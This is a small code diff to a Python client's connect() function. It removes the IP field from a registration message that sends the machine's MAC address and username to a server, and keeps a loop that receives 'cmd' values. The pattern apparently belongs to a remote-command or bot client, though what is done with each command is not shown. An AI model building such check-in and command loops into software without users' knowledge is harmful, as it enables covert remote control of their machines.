@@ -24,8 +24,7 @@ def connect():
     ip, port = s.getsockname()
     s.send(json.dumps({"type":"new",
                        "mac": mac,
-                       "username": getpass.getuser(),
-                       "ip": ip + ":" + str(port)}).encode("utf-8"))
+                       "username": getpass.getuser()}).encode("utf-8"))
     while True: # keep receiving comments
         command = s.recv(1024).decode('utf-8')
         command = json.loads(command)['cmd']
